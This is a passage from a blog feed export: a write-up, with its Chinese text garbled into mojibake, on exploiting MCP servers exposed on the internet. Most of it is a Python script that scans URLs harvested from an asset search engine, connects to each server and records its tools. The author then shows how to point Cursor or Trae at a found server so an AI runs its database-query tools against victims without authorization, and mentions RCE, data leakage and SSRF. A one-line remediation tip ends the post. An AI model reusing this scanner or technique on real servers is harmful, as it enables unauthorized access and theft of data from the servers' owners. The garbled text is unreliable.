class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(csv_file_path, <span class="hljs-string">&#x27;r&#x27;</span>, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>) <span class="hljs-keyword">as</span> file:<br>            csv_reader = csv.DictReader(file)<br>            <span class="hljs-keyword">for</span> row <span class="hljs-keyword">in</span> csv_reader:<br>                <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;url&#x27;</span> <span class="hljs-keyword">in</span> row <span class="hljs-keyword">and</span> row[<span class="hljs-string">&#x27;url&#x27;</span>]:<br>                    url = row[<span class="hljs-string">&#x27;url&#x27;</span>]<br>                    <span class="hljs-comment"># ç¡®ä¿URLä¸ä»¥/sseç»“å°¾ï¼Œå› ä¸ºæˆ‘ä»¬ä¼šåœ¨åé¢æ·»åŠ </span><br>                    <span class="hljs-keyword">if</span> url.endswith(<span class="hljs-string">&#x27;/sse&#x27;</span>):<br>                        url = url[:-<span class="hljs-number">4</span>]<br>                    urls.append(url)<br>        <span class="hljs-keyword">return</span> urls<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;è¯»å–CSVæ–‡ä»¶æ—¶å‡ºé”™: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">return</span> []<br><br><span class="hljs-comment"># ä»CSVæ–‡ä»¶ä¸­æå–URL</span><br>urls = extract_urls_from_csv(<span class="hljs-string">&#x27;assets_2025725.csv&#x27;</span>) <span class="hljs-comment"># hunteræŸ¥è¯¢å‡ºçš„æ•°æ®å¯¼å‡º</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">save_tools_to_json</span>(<span class="hljs-params">url, tools, output_file</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    å°†URLå’Œå¯¹åº”çš„å·¥å…·ä¿¡æ¯ä¿å­˜åˆ°JSONæ–‡ä»¶ä¸­</span><br><span class="hljs-string">    </span><br><span class="hljs-string">    å‚æ•°:</span><br><span class="hljs-string">        url: æœåŠ¡å™¨URL</span><br><span class="hljs-string">        tools: å·¥å…·å­—å…¸</span><br><span class="hljs-string">        output_file: è¾“å‡ºæ–‡ä»¶è·¯å¾„</span><br><span class="hljs-string">        </span><br><span class="hljs-string">    è¿”å›:</span><br><span class="hljs-string">        æˆåŠŸè¿”å›Trueï¼Œå¤±è´¥è¿”å›False</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-comment"># ç¡®ä¿è¾“å‡ºç›®å½•å­˜åœ¨</span><br>        output_dir = os.path.dirname(output_file)<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.exists(output_dir):<br>            os.makedirs(output_dir)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;åˆ›å»ºè¾“å‡ºç›®å½•: <span class="hljs-subst">&#123;output_dir&#125;</span>&quot;</span>)<br>        <br>        <span class="hljs-comment"># å‡†å¤‡è¦ä¿å­˜çš„æ•°æ®</span><br>        tools_data = &#123;&#125;<br>        <span class="hljs-keyword">for</span> tool_name, tool <span class="hljs-keyword">in</span> tools.items():<br>            <span class="hljs-comment"># å®‰å…¨åœ°è·å–å·¥å…·å±æ€§</span><br>            tool_info = &#123;<br>                <span class="hljs-string">&#x27;name&#x27;</span>: <span class="hljs-built_in">getattr</span>(tool, <span class="hljs-string">&#x27;name&#x27;</span>, tool_name),<br>                <span class="hljs-string">&#x27;description&#x27;</span>: <span class="hljs-built_in">getattr</span>(tool, <span class="hljs-string">&#x27;description&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br>            &#125;<br>            <br>            <span class="hljs-comment"># å®‰å…¨åœ°è·å–å‚æ•°ä¿¡æ¯</span><br>            <span class="hljs-keyword">if</span> <span class="hljs-built_in">hasattr</span>(tool, <span class="hljs-string">&#x27;parameters&#x27;</span>):<br>                <span class="hljs-keyword">try</span>:<br>                    <span class="hljs-comment"># å°è¯•å°†å‚æ•°è½¬æ¢ä¸ºå¯åºåˆ—åŒ–çš„æ ¼å¼</span><br>                    <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(tool.parameters, <span class="hljs-built_in">dict</span>):<br>                        tool_info[<span class="hljs-string">&#x27;parameters&#x27;</span>] = tool.parameters<br>                    <span class="hljs-keyword">else</span>:<br>                        tool_info[<span class="hljs-string">&#x27;parameters&#x27;</span>] = <span class="hljs-built_in">str</span>(tool.parameters)<br>                <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;å¤„ç†å·¥å…·å‚æ•°æ—¶å‡ºé”™: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br>                    tool_info[<span class="hljs-string">&#x27;parameters&#x27;</span>] = <span class="hljs-built_in">str</span>(tool.parameters)<br>            <br>            tools_data[tool_name] = tool_info<br>        <br>        <span class="hljs-comment"># åˆ›å»ºåŒ…å«URLå’Œå·¥å…·ä¿¡æ¯çš„æ•°æ®ç»“æ„</span><br>        data_to_save = &#123;<br>            <span class="hljs-string">&#x27;url&#x27;</span>: url,<br>            <span class="hljs-string">&#x27;tools&#x27;</span>: tools_data,<br>            <span class="hljs-string">&#x27;timestamp&#x27;</span>: datetime.datetime.now().isoformat()<br>        &#125;<br>        <br>        <span class="hljs-comment"># å¦‚æœæ–‡ä»¶å·²å­˜åœ¨ï¼Œè¯»å–ç°æœ‰æ•°æ®å¹¶æ·»åŠ æ–°æ•°æ®</span><br>        existing_data = []<br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-keyword">if</span> os.path.exists(output_file):<br>                <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(output_file, <span class="hljs-string">&#x27;r&#x27;</span>, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>                    existing_data = json.load(f)<br>                <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">isinstance</span>(existing_data, <span class="hljs-built_in">list</span>):<br>                    existing_data = [existing_data]<br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;è¯»å–ç°æœ‰JSONæ–‡ä»¶æ—¶å‡ºé”™: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br>            existing_data = []<br>        <br>        <span class="hljs-comment"># æ·»åŠ æ–°æ•°æ®å¹¶ä¿å­˜</span><br>        existing_data.append(data_to_save)<br>        <br>        <span class="hljs-comment"># ä½¿ç”¨ä¸´æ—¶æ–‡ä»¶ä¿å­˜ï¼ŒæˆåŠŸåå†é‡å‘½åï¼Œé¿å…å†™å…¥å¤±è´¥å¯¼è‡´æ–‡ä»¶æŸå</span><br>        temp_file = output_file + <span class="hljs-string">&#x27;.tmp&#x27;</span><br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(temp_file, <span class="hljs-string">&#x27;w&#x27;</span>, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>            json.dump(existing_data, f, ensure_ascii=<span class="hljs-literal">False</span>, indent=<span class="hljs-number">2</span>, default=<span class="hljs-built_in">str</span>)<br>        <br>        <span class="hljs-comment"># é‡å‘½åä¸´æ—¶æ–‡ä»¶ä¸ºç›®æ ‡æ–‡ä»¶</span><br>        os.replace(temp_file, output_file)<br>        <br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;æˆåŠŸå°†URLå’Œå·¥å…·ä¿¡æ¯ä¿å­˜åˆ° <span class="hljs-subst">&#123;output_file&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;ä¿å­˜å·¥å…·ä¿¡æ¯æ—¶å‡ºé”™: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">import</span> traceback<br>        traceback.print_exc()<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">connect_server</span>(<span class="hljs-params">base_url, timeout=<span class="hljs-number">10</span></span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    è¿æ¥åˆ° MCP æœåŠ¡å™¨å¹¶è·å–å·¥å…·åˆ—è¡¨</span><br><span class="hljs-string"></span><br><span class="hljs-string">    å‚æ•°:</span><br><span class="hljs-string">        base_url: æœåŠ¡å™¨URL</span><br><span class="hljs-string">        timeout: è¿æ¥è¶…æ—¶æ—¶é—´ï¼ˆç§’ï¼‰</span><br><span class="hljs-string"></span><br><span class="hljs-string">    è¿”å›:</span><br><span class="hljs-string">        åŒ…å«ä»¥ä¸‹é”®çš„å­—å…¸:</span><br><span class="hljs-string">        - session: ClientSession å¯¹è±¡</span><br><span class="hljs-string">        - tools: å·¥å…·å­—å…¸ &#123;name: tool&#125;</span><br><span class="hljs-string">        - exit_stack: ExitStack å¯¹è±¡ç”¨äºèµ„æºç®¡ç†</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    url = base_url<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;å°è¯•è¿æ¥åˆ°: <span class="hljs-subst">&#123;url&#125;</span>&quot;</span>)<br><br>    exit_stack = AsyncExitStack()<br>    result = &#123;<br>        <span class="hljs-string">&#x27;exit_stack&#x27;</span>: exit_stack,<br>    &#125;<br><br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-comment"># ä½¿ç”¨asyncio.wait_foræ·»åŠ è¶…æ—¶å¤„ç†</span><br>        <span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">connect</span>():<br>            <span class="hljs-comment"># å»ºç«‹ SSE è¿æ¥</span><br>            sse_cm = sse_client(url)<br>            streams = <span class="hljs-keyword">await</span> exit_stack.enter_async_context(sse_cm)<br><br>            <span class="hljs-comment"># åˆ›å»ºä¼šè¯</span><br>            session_cm = ClientSession(streams[<span class="hljs-number">0</span>], streams[<span class="hljs-number">1</span>])<br>            session = <span class="hljs-keyword">await</span> exit_stack.enter_async_context(session_cm)<br>            <span class="hljs-keyword">await</span> session.initialize()<br>            <span class="hljs-keyword">return</span> session, streams<br>        <br>        <span class="hljs-comment"># æ·»åŠ è¶…æ—¶å¤„ç†</span><br>        session, streams = <span class="hljs-keyword">await</span> asyncio.wait_for(connect(), timeout=timeout)<br><br>        <span class="hljs-comment"># è·å–å·¥å…·åˆ—è¡¨</span><br>        response = <span class="hljs-keyword">await</span> session.list_tools()<br>        tools = &#123;tool.name: tool <span class="hljs-keyword">for</span> tool <span class="hljs-keyword">in</span> response.tools&#125;<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;æˆåŠŸè·å– <span class="hljs-subst">&#123;<span class="hljs-built_in">len</span>(tools)&#125;</span> ä¸ªå·¥å…·:&quot;</span>)<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> tools:<br>            <span class="hljs-built_in">print</span>(i,tools[i].description.replace(<span class="hljs-string">&quot;\n&quot;</span>,<span class="hljs-string">&quot;&quot;</span>).replace(<span class="hljs-string">&quot;\r&quot;</span>,<span class="hljs-string">&quot;&quot;</span>))<br><br>        result[<span class="hljs-string">&#x27;session&#x27;</span>] = session<br>        result[<span class="hljs-string">&#x27;tools&#x27;</span>] = tools<br>        <span class="hljs-keyword">return</span> result<br><br>    <span class="hljs-keyword">except</span> asyncio.TimeoutError:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;è¿æ¥è¶…æ—¶: <span class="hljs-subst">&#123;url&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">await</span> exit_stack.aclose()<br>        <span class="hljs-keyword">raise</span><br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;è¿æ¥å¤±è´¥: <span class="hljs-subst">&#123;url&#125;</span>, é”™è¯¯: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">await</span> exit_stack.aclose()<br>        <span class="hljs-keyword">raise</span><br><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    ä¸»å‡½æ•°ï¼šä»CSVæ–‡ä»¶ä¸­æå–URLï¼Œè¿æ¥æœåŠ¡å™¨è·å–å·¥å…·ä¿¡æ¯ï¼Œå¹¶ä¿å­˜åˆ°JSONæ–‡ä»¶</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-comment"># å»é‡å¹¶æ‰“å°URLæ•°é‡</span><br>    unique_urls = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">set</span>(urls))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;ä»CSVæ–‡ä»¶ä¸­æå–äº† <span class="hljs-subst">&#123;<span class="hljs-built_in">len</span>(urls)&#125;</span> ä¸ªURLï¼Œå»é‡åå‰©ä½™ <span class="hljs-subst">&#123;<span class="hljs-built_in">len</span>(unique_urls)&#125;</span> ä¸ª&quot;</span>)<br>    <br>    <span class="hljs-comment"># è®°å½•å„ç§çŠ¶æ€çš„URLæ•°é‡</span><br>    success_count = <span class="hljs-number">0</span>  <span class="hljs-comment"># æˆåŠŸè¿æ¥çš„URLæ•°é‡</span><br>    saved_count = <span class="hljs-number">0</span>    <span class="hljs-comment"># æˆåŠŸä¿å­˜å·¥å…·ä¿¡æ¯çš„URLæ•°é‡</span><br>    timeout_count = <span class="hljs-number">0</span>  <span class="hljs-comment"># è¿æ¥è¶…æ—¶çš„URLæ•°é‡</span><br>    error_count = <span class="hljs-number">0</span>    <span class="hljs-comment"># å…¶ä»–é”™è¯¯çš„URLæ•°é‡</span><br>    <br>    <span class="hljs-comment"># åˆ›å»ºè¾“å‡ºç›®å½•ï¼ˆå¦‚æœä¸å­˜åœ¨ï¼‰</span><br>    output_dir = <span class="hljs-string">&#x27;tools_data&#x27;</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.exists(output_dir):<br>        os.makedirs(output_dir)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;åˆ›å»ºè¾“å‡ºç›®å½•: <span class="hljs-subst">&#123;output_dir&#125;</span>&quot;</span>)<br>    <br>    <span class="hljs-comment"># åˆ›å»ºå¸¦æœ‰æ—¶é—´æˆ³çš„è¾“å‡ºæ–‡ä»¶å</span><br>    timestamp = datetime.datetime.now().strftime(<span class="hljs-string">&#x27;%Y%m%d_%H%M%S&#x27;</span>)<br>    output_file = os.path.join(output_dir, <span class="hljs-string">f&#x27;tools_info_<span class="hljs-subst">&#123;timestamp&#125;</span>.json&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;å·¥å…·ä¿¡æ¯å°†ä¿å­˜åˆ°: <span class="hljs-subst">&#123;output_file&#125;</span>&quot;</span>)<br>    <br>    <span class="hljs-comment"># éå†æ‰€æœ‰URL</span><br>    <span class="hljs-keyword">for</span> i, url <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(unique_urls):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;\n[<span class="hljs-subst">&#123;i+<span class="hljs-number">1</span>&#125;</span>/<span class="hljs-subst">&#123;<span class="hljs-built_in">len</span>(unique_urls)&#125;</span>] æ­£åœ¨å°è¯•è¿æ¥: <span class="hljs-subst">&#123;url&#125;</span>&quot;</span>)<br>        base_url = url<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> base_url.endswith(<span class="hljs-string">&#x27;/sse&#x27;</span>):<br>            base_url += <span class="hljs-string">&quot;/sse&quot;</span><br>        <br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-comment"># è®¾ç½®è¾ƒçŸ­çš„è¶…æ—¶æ—¶é—´ï¼Œé¿å…é•¿æ—¶é—´ç­‰å¾…</span><br>            result = <span class="hljs-keyword">await</span> connect_server(base_url, timeout=<span class="hljs-number">5</span>)<br>            <span class="hljs-keyword">if</span> result <span class="hljs-keyword">and</span> <span class="hljs-string">&#x27;tools&#x27;</span> <span class="hljs-keyword">in</span> result:<br>                success_count += <span class="hljs-number">1</span><br>                tools_count = <span class="hljs-built_in">len</span>(result[<span class="hljs-string">&#x27;tools&#x27;</span>])<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;æˆåŠŸè·å– <span class="hljs-subst">&#123;tools_count&#125;</span> ä¸ªå·¥å…·ï¼Œå°è¯•ä¿å­˜...&quot;</span>)<br>                <br>                <span class="hljs-comment"># ä¿å­˜å·¥å…·ä¿¡æ¯</span><br>                <span class="hljs-keyword">try</span>:<br>                    <span class="hljs-keyword">if</span> save_tools_to_json(url, result[<span class="hljs-string">&#x27;tools&#x27;</span>], output_file):<br>                        saved_count += <span class="hljs-number">1</span><br>                        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;âœ… æˆåŠŸä¿å­˜ <span class="hljs-subst">&#123;url&#125;</span> çš„ <span class="hljs-subst">&#123;tools_count&#125;</span> ä¸ªå·¥å…·ä¿¡æ¯&quot;</span>)<br>                    <span class="hljs-keyword">else</span>:<br>                        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;âŒ ä¿å­˜ <span class="hljs-subst">&#123;url&#125;</span> çš„å·¥å…·ä¿¡æ¯å¤±è´¥&quot;</span>)<br>                <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;âŒ ä¿å­˜å·¥å…·ä¿¡æ¯æ—¶å‡ºé”™: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br>                    <span class="hljs-keyword">import</span> traceback<br>                    traceback.print_exc()<br>                <br>                <span class="hljs-comment"># å…³é—­è¿æ¥</span><br>                <span class="hljs-keyword">try</span>:<br>                    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;session&#x27;</span> <span class="hljs-keyword">in</span> result:<br>                        <span class="hljs-keyword">await</span> result[<span class="hljs-string">&#x27;session&#x27;</span>].close()<br>                    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;exit_stack&#x27;</span> <span class="hljs-keyword">in</span> result:<br>                        <span class="hljs-keyword">await</span> result[<span class="hljs-string">&#x27;exit_stack&#x27;</span>].aclose()<br>                <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;å…³é—­è¿æ¥æ—¶å‡ºé”™: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;âŒ è¿æ¥æˆåŠŸä½†æœªè·å–åˆ°å·¥å…·ä¿¡æ¯&quot;</span>)<br>                error_count += <span class="hljs-number">1</span><br>                <br>        <span class="hljs-keyword">except</span> asyncio.TimeoutError:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;â±ï¸ è¿æ¥è¶…æ—¶: <span class="hljs-subst">&#123;base_url&#125;</span>&quot;</span>)<br>            timeout_count += <span class="hljs-number">1</span><br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;âŒ è¿æ¥å¤±è´¥: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br>            error_count += <span class="hljs-number">1</span><br>    <br>    <span class="hljs-comment"># æ‰“å°æ€»ç»“ä¿¡æ¯</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;\n===== æ‰«æå®Œæˆ =====&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;æ€»å…±å°è¯•è¿æ¥: <span class="hljs-subst">&#123;<span class="hljs-built_in">len</span>(unique_urls)&#125;</span> ä¸ªURL&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;æˆåŠŸè¿æ¥å¹¶è·å–å·¥å…·: <span class="hljs-subst">&#123;success_count&#125;</span> ä¸ª&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;æˆåŠŸä¿å­˜å·¥å…·ä¿¡æ¯: <span class="hljs-subst">&#123;saved_count&#125;</span> ä¸ª&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;è¿æ¥è¶…æ—¶: <span class="hljs-subst">&#123;timeout_count&#125;</span> ä¸ª&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;å…¶ä»–é”™è¯¯: <span class="hljs-subst">&#123;error_count&#125;</span> ä¸ª&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;å·¥å…·ä¿¡æ¯å·²ä¿å­˜åˆ°: <span class="hljs-subst">&#123;output_file&#125;</span>&quot;</span>)<br>    <br>    <span class="hljs-comment"># å¦‚æœæ²¡æœ‰æˆåŠŸä¿å­˜ä»»ä½•å·¥å…·ä¿¡æ¯ï¼Œæ£€æŸ¥è¾“å‡ºæ–‡ä»¶æ˜¯å¦å­˜åœ¨</span><br>    <span class="hljs-keyword">if</span> saved_count == <span class="hljs-number">0</span>:<br>        <span class="hljs-keyword">if</span> os.path.exists(output_file):<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;è­¦å‘Š: è¾“å‡ºæ–‡ä»¶å­˜åœ¨ä½†æœªè®°å½•æˆåŠŸä¿å­˜ï¼Œè¯·æ£€æŸ¥æ–‡ä»¶å†…å®¹&quot;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;è­¦å‘Š: æœªæˆåŠŸä¿å­˜ä»»ä½•å·¥å…·ä¿¡æ¯ï¼Œè¾“å‡ºæ–‡ä»¶ä¸å­˜åœ¨&quot;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    asyncio.run(main())<br></code></pre></td></tr></table></figure><p>éƒ¨åˆ†ç»“æœå¦‚ä¸‹ï¼Œipåœ°å€</p><p><img src="https://img1.plumstar.cn/upload5CleanShot%202025-07-27%20at%2001.58.53@2x.png"></p><p><img src="https://img1.plumstar.cn/upload5CleanShot%202025-07-27%20at%2002.00.13@2x.png"></p><p>å†™åˆ°è¿™é‡Œå„ä½å¤§æ¦‚ä¹Ÿå·²ç»åˆæ­¥äº†è§£æ­¤ç±»æ¼æ´è¯¥å»å¦‚ä½•åˆ©ç”¨äº†ï¼Œä»¥æ­¤å»¶ä¼¸å‡ºæ¥çš„æ¼æ´æœ‰RCEã€æ•°æ®æ³„éœ²ã€SSRFç­‰æ¼æ´ï¼Œæœ€ç®€å•çš„æ¼æ´åº”è¯¥å°±æ˜¯ä¿¡æ¯æ³„éœ²ï¼Œç›´æ¥è°ƒç”¨mcpå»æŸ¥è¯¢å³å¯æœªæˆæƒè·å–å—å®³è€…æœåŠ¡å™¨ä¿¡æ¯</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">execute_mysql_query     æ‰§è¡Œç»™å®šçš„ <span class="hljs-keyword">SQL</span> æŸ¥è¯¢è¯­å¥å¹¶è¿”å›ç»“æœæˆ–é”™è¯¯ä¿¡æ¯ã€‚    Args:        sql_query (str): ç”± LLM ç”Ÿæˆçš„ <span class="hljs-keyword">SQL</span> æŸ¥è¯¢è¯­å¥ã€‚        max_rows (<span class="hljs-type">int</span>): å¯¹äº <span class="hljs-keyword">SELECT</span> æŸ¥è¯¢ï¼Œé™åˆ¶è¿”å›çš„æœ€å¤§è¡Œæ•°ï¼Œé˜²æ­¢ç»“æœè¿‡å¤§ã€‚    <span class="hljs-keyword">Returns</span>:        str: æ ¼å¼åŒ–åçš„æŸ¥è¯¢ç»“æœå­—ç¬¦ä¸²æˆ–é”™è¯¯ä¿¡æ¯å­—ç¬¦ä¸²ã€‚             å¯¹äº <span class="hljs-keyword">SELECT</span>ï¼Œè¿”å›è¡¨å¤´å’Œæ•°æ®è¡Œã€‚             å¯¹äº <span class="hljs-keyword">INSERT</span>/<span class="hljs-keyword">UPDATE</span>/<span class="hljs-keyword">DELETE</span>ï¼Œè¿”å›å½±å“çš„è¡Œæ•°ã€‚             å¯¹äºé”™è¯¯ï¼Œè¿”å›å…·ä½“çš„é”™è¯¯ä¿¡æ¯ã€‚    <br>list_tables     è·å–å½“å‰æ•°æ®åº“ä¸­æ‰€æœ‰è¡¨çš„åˆ—è¡¨ã€‚    å†…éƒ¨è°ƒç”¨ execute_mysql_query æ‰§è¡Œ <span class="hljs-string">&#x27;SHOW TABLES;&#x27;</span>ã€‚    <br>get_table_schema     è·å–æŒ‡å®šæ•°æ®è¡¨çš„ç»“æ„ï¼ˆåˆ—ä¿¡æ¯ï¼‰ã€‚    å†…éƒ¨è°ƒç”¨ execute_mysql_query æ‰§è¡Œ <span class="hljs-string">&#x27;DESCRIBE table_name;&#x27;</span>ã€‚    Args:        <span class="hljs-built_in">table_name</span> (str): éœ€è¦æŸ¥è¯¢ç»“æ„çš„æ•°æ®è¡¨åç§°ã€‚    <span class="hljs-keyword">Returns</span>:        str: è¡¨ç»“æ„çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²æˆ–é”™è¯¯ä¿¡æ¯ã€‚    <br>query_dify_alerts <br>query_ne_parameters     æ ¹æ®æŒ‡å®šçš„è®¾å¤‡åç§°è·å–è®¾å¤‡çš„å‚æ•°ä¿¡æ¯ã€‚    è°ƒç”¨æŒ‡å®šçš„ API æ¥å£è·å–å‚æ•°ä¿¡æ¯ï¼Œä½¿ç”¨ HTTP POST è¯·æ±‚ã€‚    Args:        StationInfoRequest (dict): æŸ¥è¯¢å‚æ•°å¯¹è±¡ï¼ŒåŒ…å«è®¾å¤‡åç§°åˆ—è¡¨    <span class="hljs-keyword">Returns</span>:        dict: åŒ…å«è®¾å¤‡å‚æ•°ä¿¡æ¯çš„ç»“æ„åŒ–æ•°æ®æˆ–é”™è¯¯ä¿¡æ¯ã€‚    <br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬æ ¹æ®è·å–åˆ°çš„ç›´æ¥å»cursoræˆ–è€…traeä¸­è°ƒç”¨mcp</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;mcpServers&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;test&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>      <span class="hljs-attr">&quot;url&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;http://xxxxxx:xxx/sse&quot;</span><br>    <span class="hljs-punctuation">&#125;</span><br>  <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p><img src="https://img1.plumstar.cn/upload5CleanShot%202025-07-27%20at%2002.20.57@2x.png"></p><p>è·å–åˆ°äº†æˆ‘ä»¬ä¸Šé¢è„šæœ¬è·‘å‡ºæ¥çš„äº”ä¸ªå·¥å…·</p><p><img src="https://img1.plumstar.cn/upload5CleanShot%202025-07-27%20at%2002.21.19@2x.png"></p><p>ç„¶åç›´æ¥aiå»è°ƒç”¨å³å¯</p><p><img src="https://img1.plumstar.cn/upload5CleanShot%202025-07-27%20at%2002.27.44@2x.png"></p><p>ç”¨æˆ‘è‡ªå·±æ”¾åˆ°å…¬ç½‘çš„mcpæµ‹è¯•å¦‚ä¸‹ï¼Œå±å®³å¤§å®¶å°±ä¸€ç›®äº†ç„¶äº†</p><p><img src="https://img1.plumstar.cn/upload5CleanShot%202025-07-27%20at%2002.31.33@2x.png"></p><h1 id="è‡ªæŸ¥åŠä¿®å¤"><a href="#è‡ªæŸ¥åŠä¿®å¤" class="headerlink" title="è‡ªæŸ¥åŠä¿®å¤"></a>è‡ªæŸ¥åŠä¿®å¤</h1><p>mcpæœåŠ¡ä¸è¦æ”¾åˆ°å…¬ç½‘ä¸Šï¼Œä»¥åŠå¦‚æœè¦æ”¾åˆ°å…¬ç½‘ä¸Šè®¾ç½®ç™½åå•</p>]]></content>
    
    
    <categories>
      
      <category>æœªæˆæƒè®¿é—®</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Mcp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>é›ªå›½</title>
    <link href="/2025/08/20/%E9%9B%AA%E5%9B%BD/"/>
    <url>/2025/08/20/%E9%9B%AA%E5%9B%BD/</url>
    
